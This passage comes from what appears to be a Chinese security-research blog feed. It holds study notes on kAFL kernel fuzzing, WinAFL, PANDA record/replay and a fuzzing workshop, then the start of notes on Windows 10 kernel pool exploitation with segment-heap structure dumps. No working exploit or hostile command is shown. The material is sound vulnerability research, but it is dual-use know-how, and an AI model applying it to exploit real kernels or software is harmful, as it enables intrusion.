Code</h2><p>Tracing整个操作系统导致有很多不确定性，如中断请求时刻都会发生。</p><p>解决方法是过滤中断和黑名单。</p><h2 id="Hypercalls"><a href="#Hypercalls" class="headerlink" title="Hypercalls"></a>Hypercalls</h2><p>hypercall由vmcall指令触发，类似于内核的syscall，hypercall是对于VMMS的。任何三环进程或者内核执行vmcall指令都会触发VM-Exit事件然后VMM来决定如何处理。kafl的hypercall是定制的，magic value被存在rax，hypercall-ID会被存在rbx，hypercall还能从三环被接收。具体hypercall的参数通过rcx传递，一个例子就是<code>HC_SUBMIT_BUFFER</code>他的参数是一个用户态指针存放在rcx中。当执行vmcall时，VM-Exit触发然后QEMU-PT存放并传递字符串指针，过一段时间会拷贝新的输入进这个指针里。最终VM的执行继续。</p><p>还有一种使用案例就是识别crash。具体办法就是patch bugcheck函数为一个hypercall。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cli<br>mov rax , KAFL_MAGIC_VALUE<br>mov rbx , HC_CRASH<br>mov rcx , 0 x0<br>vmcall<br></code></pre></td></tr></table></figure><h1 id="Implementation-Details"><a href="#Implementation-Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h1><p>主要介绍一些细节</p><h2 id="KVM-PT"><a href="#KVM-PT" class="headerlink" title="KVM-PT"></a>KVM-PT</h2><p>Intel-PT允许trace分支而不需要该内核或打补丁。但是不能长时间，而KVM-PT允许。</p><h2 id="vCPU-Specific-Traces"><a href="#vCPU-Specific-Traces" class="headerlink" title="vCPU Specific Traces"></a>vCPU Specific Traces</h2><p>为了启用pt，内核态程序需要设置MSR寄存器的特定标志位。设置完后逻辑cpu会跟踪执行的代码（满足过滤要求）。标志位修改需要在cpu从host离开前完成否则进入guest时无权限修改。另外还启用MSR autoload来达成只trace特定vcpu数据。</p><h2 id="Continuous-Tracing"><a href="#Continuous-Tracing" class="headerlink" title="Continuous Tracing"></a>Continuous Tracing</h2><p>讲解了持续化跟踪的办法与处理。</p><p><img src="image-20220907231811175.png" alt="image-20220907231811175"></p><h2 id="QEMU-PT"><a href="#QEMU-PT" class="headerlink" title="QEMU-PT"></a>QEMU-PT</h2><p>QEMU-PT作为QEMU扩展给KVM-PT提供用户态接口。接口提供一系列功能如启用关闭PT，检测溢出。KVM-PT可以通过ioctl和mmap来交互。</p><h2 id="PT-Decoder"><a href="#PT-Decoder" class="headerlink" title="PT Decoder"></a>PT Decoder</h2><p><img src="image-20220907231833837.png" alt="image-20220907231833837"></p><p>由于fuzz内核会产出一堆的数据所以需要快速精确的decoder。否则这会成为一个瓶颈。</p><p>intel提供了libipt但是并不符合需求。</p><p>kafl利用mmap并采用jit思路。且没有文件落地灯，最终数据都会被转化成AFL bitmap格式</p><h2 id="AFL-Fuzzing-Logic"><a href="#AFL-Fuzzing-Logic" class="headerlink" title="AFL Fuzzing Logic"></a>AFL Fuzzing Logic</h2><p>fuzz部分逻辑与之前博客写的类似，变异然后看是否有新的分支，有则保存后继续变异。</p><p>后面部分就是讲解kafl的实施与应用。没仔细看下去了。</p><p>后续单开文章讲源码解析。</p><h1 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h1><p>环境Ubuntu20.04物理机。</p><p>i910900k 128g内存 2tssd</p><p>安装最新版本</p><p><a href="https://github.com/IntelLabs/kAFL">https://github.com/IntelLabs/kAFL</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install python3 python3-venv<br>make deploy<br></code></pre></td></tr></table></figure><p>记得要翻墙。不然特别慢。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周学习笔记2022-8-3</title>
    <link href="/2022/08/25/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8-3/"/>
    <url>/2022/08/25/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8-3/</url>
    
    <content type="html"><![CDATA[<p>每周学习，用于督促下班后好好把握自由时间来学习。</p><a id="more"></a><p>panda先放放，后续会写插件，然后winafl也会进一步整下。</p><p>最近听了几个大佬的分享，深有感触，最近的学习计划会做相应改变。</p><h1 id="图一乐型"><a href="#图一乐型" class="headerlink" title="图一乐型"></a>图一乐型</h1><h2 id="JavaScript-Engines"><a href="#JavaScript-Engines" class="headerlink" title="JavaScript Engines"></a>JavaScript Engines</h2><p><a href="https://www.youtube.com/watch?v=FK2-1FAbbXA">https://www.youtube.com/watch?v=FK2-1FAbbXA</a></p><p>一个不错的视频。这周必须拔草。</p><p>很适合js漏洞入门，之前只是单纯复现cve写exp，其实像v8这种套路固定，写exp只需要知道套路即可。原理却不曾了解。这个视频作者讲解了历代js漏洞的出现成因，大致分为几类等等。还是挺适合入门的。</p><p>后半部分讲了一些常用的利用套路和mitigation。</p><h2 id="vt"><a href="#vt" class="headerlink" title="vt"></a>vt</h2><p><a href="https://space.bilibili.com/37877654/?spm_id_from=333.999.0.0">https://space.bilibili.com/37877654/?spm_id_from=333.999.0.0</a><br>b站有up主做了一系列的视频</p><p>就当学着完了。后续补上，先挖个坑。</p><h2 id="WINAFL"><a href="#WINAFL" class="headerlink" title="WINAFL"></a>WINAFL</h2><p>安装步骤很简单，dynamorio可以直接下现成的二进制包</p><p><a href="https://github.com/DynamoRIO/dynamorio/releases/tag/cronbuild-9.0.19230">https://github.com/DynamoRIO/dynamorio/releases/tag/cronbuild-9.0.19230</a></p><p>接着下载winafl源码后按着说明编译即可。</p><p>后面就是精读paper环节了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周学习笔记2022-8-2</title>
    <link href="/2022/08/16/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8-2/"/>
    <url>/2022/08/16/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8-2/</url>
    
    <content type="html"><![CDATA[<p>每周学习，用于督促下班后好好把握自由时间来学习。</p><a id="more"></a><p>接上文，看panda。</p><p>这星期又是比较烦躁的一星期，周一到周四需要定完试用期目标，作为团队唯一一个会点二进制（漏洞挖掘和逆向方向）真的很难顶。周五要去outing一直玩到周二，真的佛了。本周学习记录只能整四天了。</p><h1 id="Panda"><a href="#Panda" class="headerlink" title="Panda"></a>Panda</h1><p><a href="https://vimeo.com/113442048">https://vimeo.com/113442048</a></p><p>污点追踪引擎</p><p>几个很牛的特性</p><p>1.重放</p><p>2.丰富的插件</p><p>对于第一个比如逆向破解软件，找不到录入函数，直接用panda跑一波然后搜索字符串就能追踪到输入</p><p>接着自己写一些插件然后重放，直接搞定。作者这边演示了三种情形，破解 漏洞复现 和数据dump</p><p>漏洞复现对于我们漏洞挖掘还是挺有用的，可以用于检测漏洞，一些不会触发crash的漏洞。但是testcase还是需要自己去写。</p><p>但是还是有一些不确定性的。因为我看底层还是qemu，在自己的虚拟机里搭建后模拟跑操作系统然后跑软件去追踪，这样会不会巨慢？比如有个场景，通讯类软件，需要时不时发包来判断是否离线，如果跑的太慢了服务器没收到回应超时默认判定超时，永远走不到正确的路径怎么办？</p><p>当然这只是一些自己的小疑问，到底成不成还得装完才知道。</p><h1 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h1><p><img src="image-20220822165023329.png" alt="image-20220822165023329"></p><p>我的环境是Ubuntu20.04 直接运行这个install即可，安装需要一点时间，缺少的依赖自行google一下即可找到。</p><p>后面具体使用可以根据<a href="https://adalogics.com/blog/Building-a-custom-malware-sandbox-with-PANDA-Part-1%E6%96%87%E7%AB%A0%E6%9D%A5%E8%A7%A3%E5%86%B3">https://adalogics.com/blog/Building-a-custom-malware-sandbox-with-PANDA-Part-1文章来解决</a></p><p>模拟命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">remote-viewer vnc:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5900</span><br><br>.<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/panda/</span>build<span class="hljs-regexp">/x86_64-softmmu/</span>panda-system-x86_64 -monitor stdio -show-cursor -m <span class="hljs-number">32768</span> ./windows.qcow2<br></code></pre></td></tr></table></figure><p>先运行下面的然后会起一个vnc连接一下即可，推荐使用win7，win10特别卡，32位最好，当然64位也支持。</p><p>可以自己制作镜像，新建个虚拟机然后把vmdk文件复制出来后</p><p><code>qemu-img convert -f vmdk -O qcow2 x.vmdk x.qcow2</code></p><p>即可</p><p>下面是一些常用的插件命令，比如osi和stringsearch</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/panda/</span>build<span class="hljs-regexp">/x86_64-softmmu/</span>panda-system-x86_64 -monitor stdio -show-cursor -m <span class="hljs-number">32768</span> -replay todesk -panda osi -os windows-<span class="hljs-number">64</span>-<span class="hljs-number">7</span>sp1 -panda asidstory:width=<span class="hljs-number">180</span><br><br>.<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/panda/</span>build<span class="hljs-regexp">/x86_64-softmmu/</span>panda-system-x86_64 -monitor stdio -show-cursor -m <span class="hljs-number">32768</span> -replay todesk -panda stringsearch:str=calc.exe<br></code></pre></td></tr></table></figure><p>因为panda更新了但对应的很多插件readme都没更新，-os windows-64-7sp1这个可能没写，但是源码中有。</p><p>stringsearch插件单纯吧string匹配出现处的栈回溯给打印了出来</p><p><img src="image-20220822165721273.png" alt="image-20220822165721273"></p><p>功能已经很强大了另一个osi可以打印出基址啥的。</p><p>可以当作逆向的辅助工具。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周学习笔记2022-8月</title>
    <link href="/2022/08/09/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8%E6%9C%88/"/>
    <url>/2022/08/09/%E6%AF%8F%E5%91%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02022-8%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>每周学习，用于督促下班后好好把握自由时间来学习。</p><a id="more"></a><p>最近对fuzz很感兴趣，这段时间决定从0到1恶补下。</p><h1 id="Slides"><a href="#Slides" class="headerlink" title="Slides"></a>Slides</h1><p>基于winafl的fuzz入门。</p><p><a href="http://archive.hack.lu/2018/Slides_Fuzzing_Workshop_Hack.lu_v1.0.pdf">http://archive.hack.lu/2018/Slides_Fuzzing_Workshop_Hack.lu_v1.0.pdf</a></p><p>配套视频</p><p><a href="https://www.youtube.com/watch?v=V-DiwxoeXMs">https://www.youtube.com/watch?v=V-DiwxoeXMs</a></p><p>Speaker口音略重，有一定基础其实看slides就够了。</p><p>业务方需求经常有一些逆向和漏洞挖掘，其中大部分都是中小型软件，winafl很适合这个场景，可以在某种程度上减轻逆向的压力，只需要给定输入测试用例即可。</p><p><img src="image-20220814133335686.png" alt="image-20220814133335686"></p><p>fuzz类型俩种，基于语法的和基于反馈的，基于语法的需要前期做很多逆向工作，基于反馈的相对来说轻松点。fuzzer会通过变异输入来增加代码覆盖率。但是会耗很长的时间。</p><p><img src="image-20220814134215928.png" alt="image-20220814134215928">典型的反馈式fuzz如上，首先输入全是0，然后fuzzer会从第一个字节从0-0xff开始遍历，然后根据代码覆盖率来判断状态</p><p><img src="image-20220814134304659.png" alt="image-20220814134304659"></p><p>就这样遍历完了input1，在input2和input3时代码覆盖率发生改变。</p><p>接着删去input1，基于input2和3重复做上面的步骤。如下</p><p><img src="image-20220814140115559.png" alt="image-20220814140115559"></p><p>然后整个代码片段就都能被覆盖到了。</p><p><img src="image-20220814141109229.png" alt="image-20220814141109229"></p><p>可以看出原理还是暴力枚举，所以当录入长度特别大时，消耗的时间会非常的多最好的办法就是给定一个样例输入。给定的样例要足够的丰富且小，能遍历的路径多。这样会让fuzz效率提升很多。或者可以换一个变异办法，比如可以配合符号执行，利用约束求解器来，相对来说更“智能”了些。</p><p><img src="image-20220814214359180.png" alt="image-20220814214359180"></p><p>下面看看一些影响fuzz效率的要素</p><p><img src="image-20220814214454566.png" alt="image-20220814214454566"></p><p><img src="image-20220814215307710.png" alt="image-20220814215307710"></p><p>fuzzerspeed和filesize，之前提过了。很好理解</p><p>值得一提的是Detection rate，因为有很多漏洞都是不会crash的。比如一个堆溢出，后面的堆没有被使用到也没被释放，crash就检测不到。或者类似一些悬挂指针。</p><p><img src="image-20220814221526351.png" alt="image-20220814221526351"></p><p>综合如下</p><p><img src="image-20220814223331975.png" alt="image-20220814223331975"></p><p>后面的大部分都是基于实例讲解的了，很适合入门，回头装下winafl配合着测试下。作者这边也提出了一些winafl存在的缺陷然后配合了一些其他的现存工具来改写了afl。还介绍了一些逆向小技巧来讲解如何逆出输入点，有个有意思的就是配合污点追踪引擎。之前逆向一些大型软件的时候经常会遇到一些问题。找不到输入点，比如通信软件，断在send但是send时的数据已经加密了，想知道录入点在哪，但又不知道录入函数是什么。这就可以用到污点追踪引擎如panda，后续会补上</p><p><img src="image-20220814230743353.png" alt="image-20220814230743353"></p><p>最后作者介绍了自己的研究，基于其他的一些开源工具改写winafl</p><p>首先是介绍winafl的缺陷，比如快照机制，每次fuzz都要重新来跑一次，很浪费时间，能不能有一种快照机制直接从要fuzz的函数开始跑，节约时间。但是会遇到很多问题比如内存地址的改变，又或者 直接重新跑会出现一些double free等问题，从而引起误报</p><p><img src="image-20220814230948024.png" alt="image-20220814230948024"></p><p>然后是另一个缺点，winafl里的检测部分，page heap不能检测一些不会crash的漏洞</p><p><img src="image-20220814231215305.png" alt="image-20220814231215305"></p><p>最后推出了自己的改写版fuzzer</p><p><img src="image-20220814231258916.png" alt="image-20220814231258916"></p><p>貌似不是开源的。。。可惜了，但是文章还是特别适合入门。</p>]]></content>
    
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows10 kernel pool exploitation</title>
    <link href="/2022/04/17/windows10-kernel-pool-exploitation/"/>
    <url>/2022/04/17/windows10-kernel-pool-exploitation/</url>
    
    <content type="html"><![CDATA[<p>读书笔记</p><a id="more"></a><p>参考链接</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p><p><a href="https://www.synacktiv.com/sites/default/files/2021-10/2021_sthack_windows_lpe.pdf">https://www.synacktiv.com/sites/default/files/2021-10/2021_sthack_windows_lpe.pdf</a></p><p><a href="https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion">https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion</a></p><p><a href="https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf">https://github.com/cbayet/Exploit-CVE-2017-6008/blob/master/Windows10PoolParty.pdf</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf</a></p><p>学习顺序建议先把用户态的segment heap了解下再去看内核态相对容易些。</p><h1 id="Pool-internals"><a href="#Pool-internals" class="headerlink" title="Pool internals"></a>Pool internals</h1><p>先简单介绍下，segment heap之前只在用户态使用，且只针对部分系统特定进程，还有很多进程仍使用nt heap，19H1更新后segment heap被运用到了内核。</p><p>有关pool的一些结构体和基础知识这边不多提，可以看以前写过的博客。或者Tarjei Mandt的那篇<code>Kernel Pool Exploitation on Windows 7. Blackhat DC, 2011.</code></p><p>win8后推出了NonPagedPoolNx，其实和nonpagedpool没什么两样，除了代码不可执行。这用来防止在nonpagedpool中存放shellcode执行。nonpagedpool的分配现在会默认使用nonpagedpoolnx，nonpagedpool的type还存在主要是因为要适配一些老的第三方驱动。</p><p>内核态的Segment Heap和用户态的很像，目的是为了给不同大小的堆块提供不同的特征。主要有以下四种</p><p><code>— Low Fragmentation Heap (abbr LFH): RtlHpLfhContextAllocate </code></p><p><code>— Variable Size (abbr VS): RtlHpVsContextAllocateInternal </code></p><p><code>— Segment Alloc (abbr Seg): RtlHpSegAlloc </code></p><p><code>— Large Alloc: RtlHpLargeAlloc</code></p><p><img src="image-20220424202332180.png" alt="image-20220424202332180"></p><p>前三种涉及到了几个结构体_HEAP_SEG_CONTEXT，_HEAP_VS_CONTEXT，_HEAP_LFH_CONTEXT。_SEGMENT_HEAP存放了这些结构体。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs llvm">kd &gt; dt nt! _SEGMENT_HEAP<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">000</span> EnvHandle : RTL_HP_ENV_HANDLE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">010</span> Signature : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">014</span> GlobalFlags : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">018</span> Interceptor : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span><span class="hljs-keyword">c</span> ProcessHeapListIndex : Uint<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span>e AllocatedFromMetadata : Pos <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">020</span> CommitLimitData : _RTL_HEAP_MEMORY_LIMIT_DATA<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">020</span> ReservedMustBeZero<span class="hljs-number">1</span> : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">028</span> UserContext : Ptr<span class="hljs-number">64</span> Void<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">030</span> ReservedMustBeZero<span class="hljs-number">2</span> : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">038</span> Spare : Ptr<span class="hljs-number">64</span> Void<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">040</span> LargeMetadataLock : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">048</span> LargeAllocMetadata : _RTL_RB_TREE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">058</span> LargeReservedPages : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">060</span> LargeCommittedPages : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">068</span> StackTraceInitVar : _RTL_RUN_ONCE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">080</span> MemStats : _HEAP_RUNTIME_MEMORY_STATS<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>d<span class="hljs-number">8</span> GlobalLockCount : Uint<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>dc GlobalLockOwner : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0e0</span> ContextExtendLock : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0e8</span> AllocatedBase : Ptr<span class="hljs-number">64</span> UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>f<span class="hljs-number">0</span> UncommittedBase : Ptr<span class="hljs-number">64</span> UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>f<span class="hljs-number">8</span> ReservedLimit : Ptr<span class="hljs-number">64</span> UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">100</span> SegContexts : [<span class="hljs-number">2</span>] _HEAP_SEG_CONTEXT<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">280</span> VsContext : _HEAP_VS_CONTEXT<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">340</span> LfhContext : _HEAP_LFH_CONTEXT<br></code></pre></td></tr></table></figure><p>这类结构体存在五个，分别对应不同种类的pool type</p><p><code>— NonPaged pools (bit 0 unset) </code></p><p><code>— NonPagedNx pool (bit 0 unset and bit 9 set) </code></p><p><code>— Paged pools (bit 0 set) </code></p><p><code>— PagedSession pool (bit 5 and 1 set)</code></p><p>前三个都被存放在HEAP_POOL_NODES中，sessionpool的存放在current thread中</p><p><img src="image-20220424203009047.png" alt="image-20220424203009047"></p><p>用户态的segment heap只用了一个Segment Allocation对于大小在128 KiB 和508 KiB。内核使用了俩个，第二个是对于大小在508 KiB 和 7 GiB的分配准备</p><h2 id="Segment-Backend"><a href="#Segment-Backend" class="headerlink" title="Segment Backend"></a>Segment Backend</h2><p>针对大小128 KiB 到 7 GiB.也会用去分配vs和lfh的backends</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>: kd &gt; dt nt! _HEAP_SEG_CONTEXT<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">000</span> SegmentMask : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">008</span> UnitShift : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">009</span> PagesPerUnitShift : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">00</span>a FirstDescriptorIndex : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">00</span>b CachedCommitSoftShift : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">00</span><span class="hljs-keyword">c</span> CachedCommitHighShift : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">00</span>d Flags : &lt;anonymous -tag &gt;<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">010</span> MaxAllocationSize : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">014</span> OlpStatsOffset : Int<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">016</span> MemStatsOffset : Int<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">018</span> LfhContext : Ptr<span class="hljs-number">64</span> Void<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">020</span> VsContext : Ptr<span class="hljs-number">64</span> Void<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">028</span> EnvHandle : RTL_HP_ENV_HANDLE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">038</span> Heap : Ptr<span class="hljs-number">64</span> Void<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">040</span> SegmentLock : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">048</span> SegmentListHead : _LIST_ENTRY<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">058</span> SegmentCount : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">060</span> FreePageRanges : _RTL_RB_TREE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">070</span> FreeSegmentListLock : Uint<span class="hljs-number">8</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">078</span> FreeSegmentList : [<span class="hljs-number">2</span>] _SINGLE_LIST_ENTRY<br></code></pre></td></tr></table></figure><p><img src="image-20220424203517687.png" alt="image-20220424203517687"></p><p>每个segment backend分配的内存都有可变大小的段，每个段都有很多可分配的页。如上图所示，每个段都会被单向链表链接即SegmentListHead，下面紧跟着256个_HEAP_PAGE_RANGE_DESCRIPTOR结构体</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">1</span>: kd &gt; dt nt! _HEAP_PAGE_SEGMENT<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">ListEntry </span>: _LIST_ENTRY<br>+<span class="hljs-number">0</span> x010 <span class="hljs-attribute">Signature </span>: Uint8B<br>+<span class="hljs-number">0</span> x018 <span class="hljs-attribute">SegmentCommitState </span>: Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE<br>+<span class="hljs-number">0</span> x020 <span class="hljs-attribute">UnusedWatermark </span>: UChar<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">DescArray </span>: [<span class="hljs-number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>: kd &gt; dt nt! _HEAP_PAGE_RANGE_DESCRIPTOR<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">000</span> TreeNode : _RTL_BALANCED_NODE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">000</span> TreeSignature : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">004</span> UnusedBytes : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">008</span> ExtraPresent : Pos <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">008</span> Spare<span class="hljs-number">0</span> : Pos <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">15</span> Bits<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">018</span> RangeFlags : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">019</span> CommittedPageCount : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span>a Spare : Uint<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span><span class="hljs-keyword">c</span> Key : _HEAP_DESCRIPTOR_KEY<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span><span class="hljs-keyword">c</span> Align : [<span 